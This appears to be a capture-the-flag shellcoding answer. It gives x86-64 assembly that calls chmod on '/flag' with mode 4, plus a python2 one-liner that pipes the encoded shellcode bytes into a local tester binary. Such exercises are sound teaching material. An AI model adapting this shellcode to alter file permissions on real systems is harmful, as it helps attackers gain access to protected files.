```assembly
mov rax, 0x67616c662f
push rax
xor rax, rax
mov rdi, rsp
mov al, 0x5a
push 0x04
pop rsi
syscall
```

--

`python2 -c "print '\x48\xb8\x2f\x66\x6c\x61\x67\x00\x00\x00\x50\x48\x31\xc0\x48\x89\xe7\xb0\x5a\x6a\x04\x5e\x0f\x05'" | ./shellcoding_tester`
